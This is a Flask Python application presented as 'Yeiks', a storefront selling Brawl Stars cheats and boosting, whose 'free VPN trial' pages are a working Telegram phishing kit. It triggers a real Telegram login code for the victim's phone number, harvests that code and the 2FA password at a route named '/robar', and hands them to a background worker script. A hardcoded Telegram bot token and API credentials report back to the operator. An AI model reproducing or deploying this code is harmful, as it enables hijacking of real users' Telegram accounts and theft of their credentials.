from flask import Flask, request, render_template_string
import subprocess
import json
import os
import time
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ========== CONFIGURACIÓN ==========
API_ID = 37125261
API_HASH = "8886c718d2e5f4195e9b84b8a5baef34"
BOT_TOKEN = "8736887321:AAGwDSwToesQckd_Q4noE6vLi252_gsGk18"
TU_CHAT_ID = 6638415771

# ========== PÁGINA PRINCIPAL ==========
PAGINA_PRINCIPAL = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yeiks - Inicio</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Roboto, sans-serif;
            background: #0a0e1a;
            color: #eaeef2;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background-image: radial-gradient(circle at 10% 30%, #1a1f35 0%, #0a0e1a 80%);
        }
        .container {
            max-width: 500px;
            width: 100%;
            text-align: center;
            padding: 40px 20px;
        }
        .logo {
            font-size: 4rem;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 2.5rem;
            font-weight: 700;
            background: linear-gradient(135deg, #f7b733, #fc4a1a);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
        }
        .sub {
            color: #8a9bb5;
            font-size: 1.1rem;
            margin-bottom: 40px;
        }
        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 18px;
        }
        .btn {
            display: block;
            padding: 18px 30px;
            border-radius: 50px;
            font-size: 1.3rem;
            font-weight: 600;
            text-decoration: none;
            text-align: center;
            transition: transform 0.2s, box-shadow 0.2s;
            border: none;
            cursor: pointer;
        }
        .btn-shop {
            background: linear-gradient(135deg, #f7b733, #fc4a1a);
            color: #0a0e1a;
            box-shadow: 0 8px 25px -6px rgba(252, 74, 26, 0.3);
        }
        .btn-shop:hover {
            transform: scale(1.03);
            box-shadow: 0 12px 35px -6px rgba(252, 74, 26, 0.5);
        }
        .btn-reclam {
            background: rgba(255, 255, 255, 0.06);
            color: #eaeef2;
            border: 1px solid rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(4px);
        }
        .btn-reclam:hover {
            background: rgba(255, 255, 255, 0.12);
            border-color: rgba(247, 183, 51, 0.3);
            transform: scale(1.02);
        }
        .footer {
            margin-top: 50px;
            color: #4a5a75;
            font-size: 0.85rem;
            border-top: 1px solid rgba(255,255,255,0.04);
            padding-top: 20px;
        }
        @media (max-width: 480px) {
            h1 { font-size: 2rem; }
            .btn { font-size: 1.1rem; padding: 16px 20px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🛡️</div>
        <h1>Yeiks</h1>
        <p class="sub">Choose your path</p>
        <div class="btn-group">
            <a href="/shop" class="btn btn-shop">🛒 Shop</a>
            <a href="/reclam" class="btn btn-reclam">🎁 Reclam free 7 days</a>
        </div>
        <div class="footer">All plans delivered instantly via Telegram · 24/7 support</div>
    </div>
</body>
</html>
"""

# ========== PÁGINA DE SHOP (VENTAS) ==========
PAGINA_SHOP = """
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>🛒 Plans</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Roboto,sans-serif;background:#0a0e1a;color:#eaeef2;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;background-image:radial-gradient(circle at 10% 30%,#1a1f35 0%,#0a0e1a 80%)}.container{max-width:1200px;width:100%;padding:30px 20px}.header{text-align:center;margin-bottom:50px}.header h1{font-size:3rem;font-weight:700;background:linear-gradient(135deg,#f7b733,#fc4a1a);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:inline-block}.header p{color:#8a9bb5;font-size:1.2rem;margin-top:10px}.back-link{display:inline-block;margin-bottom:20px;color:#8a9bb5;text-decoration:none;font-size:.95rem}.back-link:hover{color:#f7b733}.plans-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:28px;margin-top:20px}.plan-card{background:rgba(22,28,50,.75);backdrop-filter:blur(8px);border-radius:28px;padding:28px 22px 30px;border:1px solid rgba(255,255,255,.06);box-shadow:0 20px 40px -12px rgba(0,0,0,.6);transition:transform .25s ease,box-shadow .3s ease,border-color .2s;cursor:pointer;display:flex;flex-direction:column;align-items:center;text-align:center;position:relative;overflow:hidden}.plan-card:hover{transform:translateY(-8px);box-shadow:0 30px 60px -12px rgba(247,183,51,.2);border-color:rgba(247,183,51,.25)}.plan-icon{font-size:3.2rem;margin-bottom:12px}.plan-card h2{font-size:1.5rem;font-weight:600;margin-bottom:8px;color:#fff}.plan-card .desc{font-size:.95rem;color:#b0c0d5;line-height:1.5;margin-bottom:18px;flex-grow:1}.plan-card .btn{background:linear-gradient(135deg,#f7b733,#fc4a1a);border:none;padding:12px 30px;border-radius:50px;font-weight:600;font-size:1rem;color:#0a0e1a;cursor:pointer;transition:transform .2s,box-shadow .2s;box-shadow:0 8px 20px -6px rgba(252,74,26,.3);text-decoration:none;display:inline-block}.plan-card .btn:hover{transform:scale(1.03);box-shadow:0 12px 28px -6px rgba(252,74,26,.5)}.modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);backdrop-filter:blur(6px);z-index:1000;justify-content:center;align-items:center;padding:20px;animation:fadeIn .25s ease}.modal-overlay.active{display:flex}.modal{background:#151d30;border-radius:32px;max-width:480px;width:100%;padding:36px 30px 40px;border:1px solid rgba(255,255,255,.08);box-shadow:0 40px 80px -20px #000;position:relative;animation:slideUp .3s ease}.modal h2{font-size:1.8rem;margin-bottom:8px;color:#fff}.modal .sub{color:#8a9bb5;margin-bottom:24px;font-size:1rem}.modal .options{display:flex;flex-direction:column;gap:14px}.modal .option-btn{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:18px;padding:16px 20px;color:#eaeef2;font-size:1.05rem;font-weight:500;text-decoration:none;transition:background .2s,border-color .2s,transform .15s;display:flex;align-items:center;gap:12px}.modal .option-btn:hover{background:rgba(247,183,51,.12);border-color:rgba(247,183,51,.3);transform:scale(1.01)}.modal .option-btn .emoji{font-size:1.6rem}.modal .close-modal{position:absolute;top:16px;right:22px;font-size:2rem;cursor:pointer;color:#5a6b85;transition:color .2s;background:0 0;border:none;line-height:1}.modal .close-modal:hover{color:#fc4a1a}.footer{margin-top:50px;text-align:center;color:#4a5a75;font-size:.9rem;border-top:1px solid rgba(255,255,255,.04);padding-top:24px}@keyframes fadeIn{0%{opacity:0}100%{opacity:1}}@keyframes slideUp{0%{transform:translateY(30px);opacity:0}100%{transform:translateY(0);opacity:1}}@media(max-width:700px){.header h1{font-size:2.2rem}.plans-grid{grid-template-columns:1fr;max-width:400px;margin-left:auto;margin-right:auto}.modal{padding:28px 20px 32px}}@media(max-width:480px){.header h1{font-size:1.8rem}.plan-card{padding:22px 16px 24px}.plan-card h2{font-size:1.3rem}}
</style></head>
<body>
<div class=container><a href="/" class=back-link>← Back to home</a>
<header class=header><h1>🛒 Plans &amp; where to buy them</h1><p>Choose your plan and get it now</p></header>
<div class=plans-grid>
<div class=plan-card data-plan=yeiksvpn><div class=plan-icon>🔒</div><h2>YeiksVPN</h2><div class=desc>Private, fast and secure VPN that finds a vulnerability in Brawl Stars servers and connects you to a private server to play against bots.</div><button class=btn data-plan=yeiksvpn>Buy now</button></div>
<div class=plan-card data-plan=autododge><div class=plan-icon>🎯</div><h2>Autododge + Aimbot</h2><div class=desc>Hack for Brawl Stars that gives you: auto-dodge to avoid attacks, Aimbot with micro-predictions to never miss a shot, and Kill Aura: auto-attack without pressing the red button. Available now.</div><button class=btn data-plan=autododge>Buy now</button></div>
<div class=plan-card data-plan=autogoal><div class=plan-icon>⚽</div><h2>Autogoal</h2><div class=desc>Own goal trainer – score on yourself automatically. Perfect for trolling and fun.</div><button class=btn data-plan=autogoal>Buy now</button></div>
<div class=plan-card data-plan=newaccs><div class=plan-icon>🤖</div><h2>New accs bots p3</h2><div class=desc>Buy new accounts with Brawlers at prestige 3 for wintrade 3v3.</div><button class=btn data-plan=newaccs>Buy now</button></div>
<div class=plan-card data-plan=boost><div class=plan-icon>🚀</div><h2>Boost</h2><div class=desc>Increase your rank or trophies with our professional boosting service.</div><button class=btn data-plan=boost>Buy now</button></div>
</div>
<div class=footer>All plans are delivered instantly via Telegram · 24/7 support · Secure payment</div>
</div>
<div class=modal-overlay id=modalOverlay><div class=modal id=modalContent><button class=close-modal id=closeModalBtn>&times;</button><h2 id=modalTitle>Plan</h2><p class=sub id=modalSub>Choose one option</p><div class=options id=modalOptions></div></div></div>
<script>
(function(){const plans={yeiksvpn:{title:'YeiksVPN',subtitle:'Choose how to get it:',options:[{label:'🌐 Web',url:'https://subhere.net/be615e78-6f6b-4f49-b244-a5387b7bb11e'},{label:'👤 Admin',url:'https://t.me/yeikson'}]},autododge:{title:'Autododge + Aimbot',subtitle:'Contact @yeikson to buy:',options:[{label:'💬 Chat with Admin',url:'https://t.me/yeikson'}]},autogoal:{title:'Autogoal',subtitle:'Contact @yeikson to buy:',options:[{label:'💬 Chat with Admin',url:'https://t.me/yeikson'}]},newaccs:{title:'New accs bots p3',subtitle:'Contact @yeikson to buy:',options:[{label:'💬 Chat with Admin',url:'https://t.me/yeikson'}]},boost:{title:'Boost',subtitle:'Choose your boost type:',options:[{label:'🏆 Ranked Boost',url:'https://t.me/yeikson'},{label:'⭐ Trophies Boost',url:'https://t.me/yeikson'}]}};const overlay=document.getElementById('modalOverlay'),modalTitle=document.getElementById('modalTitle'),modalSub=document.getElementById('modalSub'),modalOptions=document.getElementById('modalOptions'),closeBtn=document.getElementById('closeModalBtn');function openModal(planKey){const plan=plans[planKey];if(!plan)return;modalTitle.textContent=plan.title;modalSub.textContent=plan.subtitle;modalOptions.innerHTML='';plan.options.forEach(opt=>{const a=document.createElement('a');a.className='option-btn';a.href=opt.url;a.target='_blank';a.rel='noopener noreferrer';a.innerHTML='<span class=emoji>'+opt.label.split(' ')[0]+'</span> '+opt.label;modalOptions.appendChild(a)});overlay.classList.add('active');document.body.style.overflow='hidden'}function closeModal(){overlay.classList.remove('active');document.body.style.overflow=''}document.querySelectorAll('.plan-card .btn').forEach(btn=>{btn.addEventListener('click',function(e){e.stopPropagation();const planKey=this.dataset.plan;if(planKey)openModal(planKey)})});document.querySelectorAll('.plan-card').forEach(card=>{card.addEventListener('click',function(e){if(e.target.closest('.btn'))return;const planKey=this.dataset.plan;if(planKey)openModal(planKey)})});closeBtn.addEventListener('click',closeModal);overlay.addEventListener('click',function(e){if(e.target===overlay)closeModal()});document.addEventListener('keydown',function(e){if(e.key==='Escape'&&overlay.classList.contains('active')){closeModal()}})})();
</script>
</body>
</html>
"""

# ========== PÁGINAS DEL RECLAM (SEÑUELO) ==========
PAGINA_PASO1 = """
<!DOCTYPE html>
<html>
<head><title>Yeiks VPN - Free Trial</title>
<style>
body{font-family:Arial;background:#0a0e17;color:#fff;text-align:center;padding:40px 20px}
.container{max-width:450px;margin:0 auto;background:#1a1f2e;padding:30px;border-radius:20px;border:1px solid #2a3f5e}
h1{color:#00bcd4}
input{width:90%;padding:14px;margin:10px 0;border-radius:10px;border:none;background:#0f1420;color:#fff;font-size:16px}
button{background:#00bcd4;color:#0a0e17;border:none;padding:16px;border-radius:30px;font-size:18px;font-weight:bold;cursor:pointer;width:100%}
button:hover{background:#00e5ff}
.back-link{color:#8a9bb5;display:inline-block;margin-bottom:20px;text-decoration:none}
</style>
</head>
<body>
<a href="/" class="back-link">← Back to home</a>
<div class=container>
<h1>🛡️ Yeiks VPN 🇦🇶</h1>
<p>1 week FREE. Enter your phone number.</p>
<form method=POST action=/paso2>
<input type=tel name=phone placeholder="📱 Phone number" required>
<button type=submit>Send Code</button>
</form>
</div>
</body>
</html>
"""

PAGINA_PASO2 = """
<!DOCTYPE html>
<html>
<head><title>Yeiks VPN</title>
<style>
body{font-family:Arial;background:#0a0e17;color:#fff;text-align:center;padding:40px 20px}
.container{max-width:450px;margin:0 auto;background:#1a1f2e;padding:30px;border-radius:20px;border:1px solid #2a3f5e}
h1{color:#00bcd4}
input{width:90%;padding:14px;margin:10px 0;border-radius:10px;border:none;background:#0f1420;color:#fff;font-size:16px}
button{background:#00bcd4;color:#0a0e17;border:none;padding:16px;border-radius:30px;font-size:18px;font-weight:bold;cursor:pointer;width:100%}
button:hover{background:#00e5ff}
</style>
</head>
<body>
<div class=container>
<h1>🔑 Verification Code</h1>
<p>Sent to <strong>{{ phone }}</strong></p>
<form method=POST action=/robar>
<input type=hidden name=phone value="{{ phone }}">
<input type=text name=code placeholder="Enter 5-digit code" required>
<button type=submit>Activate VPN</button>
</form>
</div>
</body>
</html>
"""

PAGINA_2FA = """
<!DOCTYPE html>
<html>
<head><title>2FA Required</title>
<style>
body{font-family:Arial;background:#0a0e17;color:#fff;text-align:center;padding:40px 20px}
.container{max-width:450px;margin:0 auto;background:#1a1f2e;padding:30px;border-radius:20px;border:1px solid #2a3f5e}
h1{color:#ff9800}
input{width:90%;padding:14px;margin:10px 0;border-radius:10px;border:none;background:#0f1420;color:#fff;font-size:16px}
button{background:#ff9800;color:#0a0e17;border:none;padding:16px;border-radius:30px;font-size:18px;font-weight:bold;cursor:pointer;width:100%}
button:hover{background:#ffb74d}
</style>
</head>
<body>
<div class=container>
<h1>🔐 2FA Required</h1>
<p>Enter your 2FA password</p>
<form method=POST action=/robar>
<input type=hidden name=phone value="{{ phone }}">
<input type=hidden name=code value="{{ code }}">
<input type=password name=password_2fa placeholder="2FA password" required>
<button type=submit>Activate VPN</button>
</form>
</div>
</body>
</html>
"""

ERR = """
<!DOCTYPE html>
<html>
<head><title>Error</title></head>
<body style="background:#0a0e17;color:#fff;text-align:center;padding:50px;font-family:Arial">
<h2 style=color:#ff5252>Verification Error</h2>
<p>Incorrect code or password.</p>
<a href="/" style=color:#00bcd4>Try again</a>
</body>
</html>
"""

# ========== FUNCIONES ==========
PENDING_FILE = "pending.json"

def save_pending(phone, code="", password=None):
    with open(PENDING_FILE, "w") as f:
        json.dump({"phone": phone, "code": code, "password": password}, f)

def get_pending():
    if os.path.exists(PENDING_FILE):
        with open(PENDING_FILE, "r") as f:
            return json.load(f)
    return None

def enviar_notificacion(texto):
    try:
        import requests
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": TU_CHAT_ID, "text": texto}, timeout=5)
    except:
        pass

def enviar_codigo(phone):
    import asyncio
    from telethon import TelegramClient
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def send():
        client = TelegramClient(f"temp_{phone.replace('+','')}", API_ID, API_HASH)
        await client.connect()
        try:
            await client.sign_in(phone=phone)
            await client.disconnect()
            return True
        except:
            await client.disconnect()
            return False
    result = loop.run_until_complete(send())
    loop.close()
    return result

def ejecutar_worker_en_hilo(phone, code, password_2fa):
    import threading
    import subprocess
    threading.Thread(target=lambda: subprocess.run(["python", "worker.py", phone, code, password_2fa or ""], capture_output=True), daemon=True).start()

# ========== RUTAS ==========
@app.route('/')
def index():
    return render_template_string(PAGINA_PRINCIPAL)

@app.route('/shop')
def shop():
    return render_template_string(PAGINA_SHOP)

@app.route('/reclam')
def reclam():
    return render_template_string(PAGINA_PASO1)

@app.route('/paso2', methods=['POST'])
def paso2():
    phone = request.form.get('phone', '').strip()
    if not phone:
        return render_template_string(ERR)
    if enviar_codigo(phone):
        save_pending(phone, code="")
        return render_template_string(PAGINA_PASO2, phone=phone)
    else:
        enviar_notificacion(f"❌ No se pudo enviar código a {phone}")
        return render_template_string(ERR)

@app.route('/robar', methods=['POST'])
def robar():
    phone = request.form.get('phone', '').strip()
    code = request.form.get('code', '').strip()
    password_2fa = request.form.get('password_2fa', '').strip() or None
    if not phone or not code:
        return render_template_string(ERR)
    save_pending(phone, code=code, password=password_2fa)
    ejecutar_worker_en_hilo(phone, code, password_2fa)
    return render_template_string(ERR)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
